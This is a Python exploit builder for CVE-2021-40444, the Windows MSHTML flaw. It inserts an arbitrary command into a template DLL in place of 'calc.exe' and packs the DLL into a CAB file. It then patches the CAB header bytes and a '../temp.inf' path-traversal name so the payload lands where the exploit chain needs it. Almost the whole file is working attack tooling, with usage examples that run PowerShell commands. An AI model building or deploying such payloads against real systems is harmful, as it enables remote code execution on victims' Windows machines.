import string
import random
import time
import sys 
import os

"""Nothing here"""

def makedll(command):
	''''''''''''''''''''''''''''''''''''''
	print(f"make dll using command [{command}]")
	f_name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(5))
	f_name = f_name + '.dll'
	f_dll = open('calc.dll', 'rb')
	data = f_dll.read()
	f_dll.close()
	out_data = data.replace(b'calc.exe', bytes(command.encode()))
	f = open(f_name, 'wb').write(out_data)
	time.sleep(1)
	return f_name
def makecab(f_name, f_out, f_in):
	''''''''''''''''''''''''''''''''''''''
	print(f"input dll [{f_in}]")
	if "cab" not in f_name:
		f_name = f_name + '.cab' 
	if(os.name !='nt'):
		return "Stop, this script only support windows (have makecab ;)!"
		exit(0)
	else:
		ddf = f""";*** MakeCAB Directive file;
		.OPTION EXPLICIT
		.Set CabinetNameTemplate="{f_name}"
		.Set DiskDirectory1="{f_out}"
		.Set MaxDiskSize=0
		.Set Cabinet=on
		.Set Compress=on
		.Set CabinetFileCountThreshold=0
		.Set FolderFileCountThreshold=0
		.Set FolderSizeThreshold=0
		.Set MaxCabinetSize=0
		.Set MaxDiskFileCount=0
		.Set MaxDiskSize=0
		"{f_in}" "..\\temp.inf"
		"""
		f_ddf = open(f_name+'.ddf', 'w').write(ddf)
		print(os.popen(f"makecab /F {f_name}.ddf").read())
		time.sleep(1)
		"""Patch CAB by lockedbyte"""
		m_off = 0x2d
		f = open(f_name,'rb')
		cab_data = f.read()
		f.close()
		out_cab_data = cab_data[:m_off]
		out_cab_data += b'\x00\x5c\x41\x00'
		out_cab_data += cab_data[m_off+4:]
		out_cab_data = out_cab_data.replace(b'..\\temp.inf', b'../temp.inf')

		f = open(f_name,'wb')
		f.write(out_cab_data)
		f.close()
		time.sleep(5)
		os.popen(f"del setup.inf setup.rpt *.ddf {f_in}")
		return print(f"Cabinet templates [{f_name}]\nINF name [../temp.inf]")
def main():
	if len(sys.argv) < 2:
		data = f"""[%] python3 {sys.argv[0]} <calc.cab> <command/file.dll>
[i] Example: python3 {sys.argv[0]} powershell.cab "powershell -C mspaint"\n\tpython3 {sys.argv[0]} power.cab calc.dll
		"""
		print(data)
		exit()
	if 'dll' not in sys.argv[2]:
		makecab(f_name=sys.argv[1], f_out='.', f_in=makedll(sys.argv[2]))
	else:
		makecab(f_name=sys.argv[1], f_out='.', f_in=sys.argv[2])
if __name__ == '__main__':
	print('[%] CVE-2021-40444 - Custom CAB templates with Command [%]')
	main()
